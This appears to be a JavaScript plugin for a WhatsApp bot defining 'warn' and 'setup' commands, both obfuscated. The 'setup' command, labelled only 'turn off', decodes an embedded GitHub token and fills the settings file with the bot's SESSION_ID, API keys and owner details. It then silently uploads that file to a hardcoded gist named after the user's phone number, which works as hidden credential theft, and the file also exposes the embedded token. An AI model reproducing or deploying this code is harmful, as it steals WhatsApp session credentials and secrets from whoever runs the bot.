const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.js')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================




//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})





  command({
    pattern: "setup",
    fromMe: true,
    desc: "turn off",
    dontAddCommandList: true,
    type: "admin",
  
  },
  async (message, match, m) => {
function _0x52bb(_0x2d4517,_0x4da925){const _0x332438=_0x3324();return _0x52bb=function(_0x52bb2a,_0x1229df){_0x52bb2a=_0x52bb2a-0xe6;let _0x212324=_0x332438[_0x52bb2a];return _0x212324;},_0x52bb(_0x2d4517,_0x4da925);}const _0x215b16=_0x52bb;function _0x3324(){const _0x44da96=['readFileSync','FOOTER','BOT_NAME','SESSION_ID','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','ANTILINK','Cloud\x20DB\x20Update','reply','LANGUAGE','LANG','INTERNAL_MENU','phone_num','BRANCH','GOODBYE_MSG','user','370IzAYyV','PACKNAME','FONT_STYLE','send','client','LOGS','ALIVE','groupCreate','rest','stringify','utf-8','WORK_TYPE','config','isGroup','62634cNOoTt','update','WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv','UserId','creds','sendMessage','2762456TDrvUn','5955993ONAluQ','DB_AUTH_TOKEN','14nUrZTt','parse','_You\x20Are\x20Already\x20a\x20Family\x20Member_','210narqVK','THEME','./media/AAA.jpg','OWNER_NAME','reset','from','RMBG_KEY','324376bEcKqw','AUTHOR','env','407374LnuJvZ','ANTILINK_ACTION','25722dEnUgz','includes','updateProfilePicture','Done\x20Creating\x20New\x20Db','Storage','_Registered\x20Successfully_','base64','MESSAGE_MEM','58IIwSBm','WELCOME_MSG','log','SUDO','./database/settings.json','STORAGE_JID','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','DB_URL','jid','HANDLER','746477UzZxqj','name','then','toString','split','359889999996@s.whatsapp.net'];_0x3324=function(){return _0x44da96;};return _0x3324();}(function(_0x4fe9e8,_0x3561e3){const _0x3df7b9=_0x52bb,_0x4e7450=_0x4fe9e8();while(!![]){try{const _0x277ebc=parseInt(_0x3df7b9(0xf6))/0x1+parseInt(_0x3df7b9(0xec))/0x2*(-parseInt(_0x3df7b9(0x119))/0x3)+parseInt(_0x3df7b9(0x12c))/0x4+-parseInt(_0x3df7b9(0x125))/0x5*(-parseInt(_0x3df7b9(0x131))/0x6)+parseInt(_0x3df7b9(0x122))/0x7*(parseInt(_0x3df7b9(0x11f))/0x8)+parseInt(_0x3df7b9(0x120))/0x9+-parseInt(_0x3df7b9(0x10b))/0xa*(parseInt(_0x3df7b9(0x12f))/0xb);if(_0x277ebc===_0x3561e3)break;else _0x4e7450['push'](_0x4e7450['shift']());}catch(_0x4f4b6f){_0x4e7450['push'](_0x4e7450['shift']());}}}(_0x3324,0x5dd28));if(message[_0x215b16(0x118)])return;const {Octokit}=require('@octokit/rest'),octokit=new Octokit({'auth':await config[_0x215b16(0x121)]});setTimeout(()=>{const _0x328e69=_0x215b16;let _0x3a6ab1=JSON[_0x328e69(0x123)](fs[_0x328e69(0xfc)](_0x328e69(0xf0))),_0x486e75=_0x3a6ab1[_0x328e69(0x117)][_0x328e69(0xf1)],_0x3d5bf8=_0x486e75[_0x328e69(0xf9)]()['includes']('@g.us');if(!_0x3d5bf8)readFile(path,async(_0x5ea0ea,_0x1185de)=>{const _0x2605f0=_0x328e69;if(_0x5ea0ea){console[_0x2605f0(0xee)](_0x5ea0ea);return;}const _0x1de3dd=JSON[_0x2605f0(0x123)](_0x1185de);let _0x43c00f=await message[_0x2605f0(0x10f)][_0x2605f0(0x112)](_0x2605f0(0xe8),[_0x2605f0(0xfb)]);await message[_0x2605f0(0x10f)][_0x2605f0(0x11e)](_0x43c00f['id'],{'text':_0x2605f0(0xf2)});let _0x409517=await _0x43c00f['id'];_0x1de3dd[_0x2605f0(0x117)][_0x2605f0(0xf1)]=_0x409517,writeFile(path,JSON[_0x2605f0(0x114)](_0x1de3dd,null,0x2),async _0x3b3431=>{const _0x22375c=_0x2605f0;if(_0x3b3431){message[_0x22375c(0x103)]('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}await message['client'][_0x22375c(0xe6)](_0x43c00f['id'],fs[_0x22375c(0xfc)](_0x22375c(0x127)));});});else return;setTimeout(async()=>{const _0x5d3dfe=_0x328e69;let _0x31f598=require('../session.json'),_0x1d3fb4=await _0x31f598['creds']['me']['id'][_0x5d3dfe(0xfa)](':')[0x0],_0x3e4dae=await _0x31f598[_0x5d3dfe(0x11d)]['me']['id']['split']('@')[0x1],_0x575acc=_0x1d3fb4+'@'+_0x3e4dae,_0x49ac2a=_0x575acc+'.json';const _0x5ab5b3=fs[_0x5d3dfe(0xfc)](_0x5d3dfe(0xf0),_0x5d3dfe(0x115));await octokit[_0x5d3dfe(0x113)]['gists'][_0x5d3dfe(0x11a)]({'gist_id':'a216db893ba4f4a18d4f1476bfc1bb4d','description':_0x5d3dfe(0x102),'files':{[_0x49ac2a]:{'content':_0x5ab5b3}}})[_0x5d3dfe(0xf8)](await console['log'](_0x5d3dfe(0xe7))),setTimeout(()=>{const _0x33d807=_0x5d3dfe;return process[_0x33d807(0x10e)](_0x33d807(0x129));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x36bc77,_0x315479)=>{const _0x2b36c4=_0x215b16;if(_0x36bc77){console[_0x2b36c4(0xee)](_0x36bc77);return;}const _0x51af69=JSON[_0x2b36c4(0x123)](_0x315479);let _0x36ebd4=_0x51af69[_0x2b36c4(0x11c)]['toString']()[_0x2b36c4(0x132)]('@s.whatsapp.net');if(_0x36ebd4)return message[_0x2b36c4(0x103)](_0x2b36c4(0x124));let _0x148bec=process[_0x2b36c4(0x12e)][_0x2b36c4(0x121)]===undefined?_0x2b36c4(0x11b):process[_0x2b36c4(0x12e)][_0x2b36c4(0x121)],_0x33c599=Buffer[_0x2b36c4(0x12a)](_0x148bec,_0x2b36c4(0xea))[_0x2b36c4(0xf9)](_0x2b36c4(0x115)),_0x20b711=_0x33c599[_0x2b36c4(0xf9)]()[_0x2b36c4(0xfa)]('/'),_0x379cd5='';for(let _0xb06500 of _0x20b711){_0x379cd5+=await Buffer[_0x2b36c4(0x12a)](_0xb06500+'==',_0x2b36c4(0xea))[_0x2b36c4(0xf9)](_0x2b36c4(0x115));}let _0x4ad501=message['pushName'],_0x3f538b=message[_0x2b36c4(0x10a)],_0x5cf7ea=message[_0x2b36c4(0xf4)]['toString']()[_0x2b36c4(0xfa)]('@')[0x0];_0x51af69[_0x2b36c4(0xf7)]=_0x4ad501,_0x51af69[_0x2b36c4(0x11c)]=_0x3f538b,_0x51af69[_0x2b36c4(0x107)]=_0x5cf7ea,_0x51af69['config'][_0x2b36c4(0xf5)]=relconfig[_0x2b36c4(0xf5)],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x116)]=relconfig[_0x2b36c4(0x116)],_0x51af69['config'][_0x2b36c4(0xfe)]=relconfig[_0x2b36c4(0xfe)],_0x51af69['config'][_0x2b36c4(0x128)]=relconfig['OWNER_NAME'],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0xef)]=relconfig[_0x2b36c4(0xef)],_0x51af69['config'][_0x2b36c4(0x12d)]=relconfig['AUTHOR'],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x10c)]=relconfig[_0x2b36c4(0x10c)],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x12b)]=relconfig['RMBG_KEY'],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x105)]=relconfig[_0x2b36c4(0x105)],_0x51af69[_0x2b36c4(0x117)]['ANTILINK_ACTION']=relconfig[_0x2b36c4(0x130)],_0x51af69[_0x2b36c4(0x117)]['ANTILINK']=relconfig[_0x2b36c4(0x101)],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0xfd)]=relconfig['FOOTER'],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x126)]=relconfig['THEME'],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x10d)]=relconfig[_0x2b36c4(0x10d)],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x104)]=relconfig[_0x2b36c4(0x104)],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x106)]=relconfig[_0x2b36c4(0x106)],_0x51af69['config']['MODE']=relconfig['MODE'],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0xf1)],_0x51af69['config'][_0x2b36c4(0xf3)],_0x51af69[_0x2b36c4(0x117)]['SESSION_ID']=relconfig[_0x2b36c4(0xff)],_0x51af69[_0x2b36c4(0x117)]['LOGS']=relconfig[_0x2b36c4(0x110)],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x108)]=relconfig[_0x2b36c4(0x108)],_0x51af69[_0x2b36c4(0x117)]['B1']=relconfig['B1'],_0x51af69[_0x2b36c4(0x117)]['B2']=relconfig['B2'],_0x51af69[_0x2b36c4(0x117)]['B3']=relconfig['B3'],_0x51af69[_0x2b36c4(0x117)]['B4']=relconfig['B4'],_0x51af69['config']['B5']=relconfig['B5'],_0x51af69[_0x2b36c4(0x117)][_0x2b36c4(0x121)]=_0x379cd5,_0x51af69[_0x2b36c4(0xeb)][_0x2b36c4(0x109)]=relconfig['GOODBYE_MSG'],_0x51af69[_0x2b36c4(0xeb)][_0x2b36c4(0xed)]=relconfig[_0x2b36c4(0xed)],_0x51af69[_0x2b36c4(0xeb)][_0x2b36c4(0x111)]=relconfig[_0x2b36c4(0x111)],writeFile(path,JSON[_0x2b36c4(0x114)](_0x51af69,null,0x2),_0x509f6f=>{const _0x11b0cb=_0x2b36c4;if(_0x509f6f){message[_0x11b0cb(0x103)](_0x11b0cb(0x100));return;}message[_0x11b0cb(0x103)](_0x11b0cb(0xe9));});});
  })


